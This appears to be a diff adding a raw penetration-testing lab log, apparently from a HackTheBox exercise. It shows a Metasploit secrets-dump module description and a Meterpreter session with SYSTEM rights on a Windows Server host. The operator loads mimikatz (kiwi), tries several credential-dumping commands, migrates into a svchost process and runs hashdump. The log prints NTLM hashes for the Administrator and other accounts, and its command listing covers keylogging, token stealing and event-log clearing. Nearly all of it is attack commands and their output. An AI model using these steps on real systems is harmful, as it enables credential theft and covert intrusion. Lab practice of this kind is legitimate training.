+    Name    Description
+    ----    -----------
+=>  ALL     Dump everything
+    CACHE   Dump cached hashes
+    DOMAIN  Dump domain secrets (credentials, password history, Kerberos keys, etc.)
+    LSA     Dump LSA secrets
+    SAM     Dump SAM hashes
+
+Check supported:
+  No
+
+Basic options:
+  When ACTION is one of ALL,DOMAIN:
+
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  KRB_TYPES  ALL              yes       Which type of accounts to retrieve kerberos details for (Accepted: ALL, USERS_ONLY, COMPUTERS_ONLY)
+  KRB_USERS                   no        Comma-separated list of user accounts or groups to retrieve kerberos details for
+
+
+  When ACTION is one of ALL,SAM,CACHE,LSA:
+
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  INLINE  true             yes       Use inline technique to read protected keys from the registry remotely without saving the hives to disk
+
+
+  Used when connecting via an existing SESSION:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION  1                no        The session to run this module on
+
+
+  Used when making a new connection via RHOSTS:
+
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT      445              yes       The target port (TCP)
+  SMBDomain  .                no        The Windows domain to use for authentication
+  SMBPass                     no        The password for the specified username
+  SMBUser                     no        The username to authenticate as
+
+Description:
+  Dumps SAM hashes and LSA secrets (including cached creds) from the
+  remote Windows target without executing any agent locally. This is
+  done by remotely updating the registry key security descriptor,
+  taking advantage of the WriteDACL privileges held by local
+  administrators to set temporary read permissions.
+
+  This can be disabled by setting the `INLINE` option to false and the
+  module will fallback to the original implementation, which consists
+  in saving the registry hives locally on the target
+  (%SYSTEMROOT%\Temp\<random>.tmp), downloading the temporary hive
+  files and reading the data from it. This temporary files are removed
+  when it's done.
+
+  On domain controllers, secrets from Active Directory is extracted
+  using [MS-DRDS] DRSGetNCChanges(), replicating the attributes we need
+  to get SIDs, NTLM hashes, groups, password history, Kerberos keys and
+  other interesting data. Note that the actual `NTDS.dit` file is not
+  downloaded. Instead, the Directory Replication Service directly asks
+  Active Directory through RPC requests.
+
+  This modules takes care of starting or enabling the Remote Registry
+  service if needed. It will restore the service to its original state
+  when it's done.
+
+  This is a port of the great Impacket `secretsdump.py` code written by
+  Alberto Solino.
+
+References:
+  https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
+  https://attack.mitre.org/techniques/T1003/002/
+  https://attack.mitre.org/techniques/T1003/004/
+  https://attack.mitre.org/techniques/T1003/005/
+  https://attack.mitre.org/techniques/T1003/006/
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:1) auxiliary(gather/windows_secrets_dump) >> sessions 1
+[*] Starting interaction with 1...
+
+(Meterpreter 1)(C:\Windows\system32) > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Priv: Elevate Commands
+======================
+
+    Command                   Description
+    -------                   -----------
+    getsystem                 Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command                   Description
+    -------                   -----------
+    hashdump                  Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command                   Description
+    -------                   -----------
+    timestomp                 Manipulate file MACE attributes
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    show_mount                List all mount points/logical drives
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    clearev                   Clear the event log
+    drop_token                Relinquishes any active impersonation token.
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getprivs                  Attempt to enable all privileges available to the current process
+    getsid                    Get the SID of the user that the server is running as
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    reboot                    Reboots the remote computer
+    reg                       Modify and interact with the remote registry
+    rev2self                  Calls RevertToSelf() on the remote machine
+    shell                     Drop into a system command shell
+    shutdown                  Shuts down the remote computer
+    steal_token               Attempts to steal an impersonation token from the target process
+    suspend                   Suspends or resumes a list of processes
+    sysinfo                   Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    enumdesktops              List all accessible desktops and window stations
+    getdesktop                Get the current meterpreter desktop
+    idletime                  Returns the number of seconds the remote user has been idle
+    keyboard_send             Send keystrokes
+    keyevent                  Send key events
+    keyscan_dump              Dump the keystroke buffer
+    keyscan_start             Start capturing keystrokes
+    keyscan_stop              Stop capturing keystrokes
+    mouse                     Send mouse events
+    screenshare               Watch the remote user desktop in real time
+    screenshot                Grab a screenshot of the interactive desktop
+    setdesktop                Change the meterpreters current desktop
+    uictl                     Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the default microphone for X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the target system
+
+For more info on a specific command, use <command> -h or help <command>.
+
+(Meterpreter 1)(C:\Windows\system32) > getsystem
+[-] Already running as SYSTEM
+(Meterpreter 1)(C:\Windows\system32) > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 6836 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>exit
+exit
+(Meterpreter 1)(C:\Windows\system32) > hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
+(Meterpreter 1)(C:\Windows\system32) > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+(Meterpreter 1)(C:\Windows\system32) > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+
+(Meterpreter 1)(C:\Windows\system32) > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+
+(Meterpreter 1)(C:\Windows\system32) > creds_wdigest
+[+] Running as SYSTEM
+[*] Retrieving wdigest credentials
+
+(Meterpreter 1)(C:\Windows\system32) > 
+(Meterpreter 1)(C:\Windows\system32) > 
+(Meterpreter 1)(C:\Windows\system32) > 
+(Meterpreter 1)(C:\Windows\system32) > kiwi_cmd sekurlu::logonpasswords
+ERROR mimikatz_doLocal ; "sekurlu" module not found !
+
+        standard  -  Standard module  [Basic commands (does not require module name)]
+          crypto  -  Crypto Module
+        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+        kerberos  -  Kerberos package module  []
+             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
+       privilege  -  Privilege module
+         process  -  Process module
+         service  -  Service module
+         lsadump  -  LsaDump module
+              ts  -  Terminal Server module
+           event  -  Event module
+            misc  -  Miscellaneous module
+           token  -  Token manipulation module
+           vault  -  Windows Vault/Credential module
+     minesweeper  -  MineSweeper module
+             net  -  
+           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+          sysenv  -  System Environment Value module
+             sid  -  Security Identifiers module
+             iis  -  IIS XML Config module
+             rpc  -  RPC control of mimikatz
+            sr98  -  RF module for SR98 device and T5577 target
+             rdm  -  RF module for RDM(830 AL) device
+             acr  -  ACR Module
+
+(Meterpreter 1)(C:\Windows\system32) > creds_msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+
+(Meterpreter 1)(C:\Windows\system32) > 
+(Meterpreter 1)(C:\Windows\system32) > 
+(Meterpreter 1)(C:\Windows\system32) > sysinfo
+Computer        : WIN-51BJ97BCIPV
+OS              : Windows Server 2019 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x86/windows
+(Meterpreter 1)(C:\Windows\system32) > ps
+
+Process List
+============
+
+ PID    PPID   Name         Arch  Session  User              Path
+ ---    ----   ----         ----  -------  ----              ----
+ 0      0      [System Pro
+               cess]
+ 4      0      System       x64   0
+ 64     612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 88     4      Registry     x64   0
+ 260    4      smss.exe     x64   0
+ 296    612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 312    3288   svchost.exe  x86   0        NT AUTHORITY\SYS  C:\Windows\Temp\r
+                                           TEM               ad61152.tmp\svcho
+                                                             st.exe
+ 336    612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 368    360    csrss.exe    x64   0
+ 476    360    wininit.exe  x64   0
+ 484    468    csrss.exe    x64   1
+ 540    468    winlogon.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\System
+               e                           TEM               32\winlogon.exe
+ 612    476    services.ex  x64   0
+               e
+ 628    476    lsass.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\lsass.exe
+ 648    612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 732    612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 752    612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 772    476    fontdrvhost  x64   0        Font Driver Host  C:\Windows\System
+               .exe                        \UMFD-0           32\fontdrvhost.ex
+                                                             e
+ 824    612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 868    540    dwm.exe      x64   1        Window Manager\D  C:\Windows\System
+                                           WM-1              32\dwm.exe
+ 876    612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 936    540    fontdrvhost  x64   1        Font Driver Host  C:\Windows\System
+               .exe                        \UMFD-1           32\fontdrvhost.ex
+                                                             e
+ 956    3288   iisexpresst  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+               ray.exe                     TEM               IIS Express\iisex
+                                                             presstray.exe
+ 988    612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 1104   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1164   612    vm3dservice  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               .exe                        TEM               32\vm3dservice.ex
+                                                             e
+ 1184   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1208   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1212   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1220   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1252   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1320   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 1352   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1368   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 1436   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1456   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1464   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1488   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1496   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1604   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1724   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1732   10824  conhost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\conhost.exe
+ 1856   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1880   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1884   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1916   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1972   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1996   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2004   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2020   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2052   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2156   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2300   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2308   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2420   3288   conhost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\conhost.exe
+ 2468   612    spoolsv.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\spoolsv.exe
+ 2508   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2516   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2552   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2572   612    fortilogger  x86   0        NT AUTHORITY\SYS  C:\Program Files\
+               listener.ex                 TEM               RZK\Fortilogger\L
+               e                                             istener\fortilogg
+                                                             erlistener.exe
+ 2584   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2592   612    fortilogger  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+               service.exe                 TEM               RZK\Fortilogger\S
+                                                             ervice\fortilogge
+                                                             rservice.exe
+ 2628   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2640   612    mongod.exe   x64   0        NT AUTHORITY\SYS  C:\Program Files\
+                                           TEM               MongoDB\Server\4.
+                                                             2\bin\mongod.exe
+ 2664   612    mongod.exe   x64   0        NT AUTHORITY\SYS  C:\Program Files\
+                                           TEM               MongoDB\Server\4.
+                                                             2\bin\mongod.exe
+ 2676   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2684   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2704   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2744   612    vmtoolsd.ex  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+               e                           TEM               VMware\VMware Too
+                                                             ls\vmtoolsd.exe
+ 2756   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2768   612    VGAuthServi  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+               ce.exe                      TEM               VMware\VMware Too
+                                                             ls\VMware VGAuth\
+                                                             VGAuthService.exe
+ 2780   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2788   612    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2860   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2912   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 3044   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 3288   2592   iisexpress.  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+               exe                         TEM               IIS Express\iisex
+                                                             press.exe
+ 3548   612    dllhost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\dllhost.exe
+ 3828   752    WmiPrvSE.ex  x64   0        NT AUTHORITY\NET  C:\Windows\System
+               e                           WORK SERVICE      32\wbem\WmiPrvSE.
+                                                             exe
+ 4048   540    LogonUI.exe  x64   1        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\LogonUI.exe
+ 4104   612    msdtc.exe    x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\msdtc.exe
+ 4460   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 4644   612    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 6492   612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 9176   612    svchost.exe  x64   0
+ 10456  612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 10824  3288   WMIC.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\wbem\WMIC.exe
+ 11232  612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 11288  752    WmiPrvSE.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               e                           TEM               32\wbem\WmiPrvSE.
+                                                             exe
+ 12148  612    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+
+(Meterpreter 1)(C:\Windows\system32) > migrate 732
+[*] Migrating from 312 to 732...
+[*] Migration completed successfully.
+(Meterpreter 1)(C:\Windows\system32) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+(Meterpreter 1)(C:\Windows\system32) > 
 
 ```
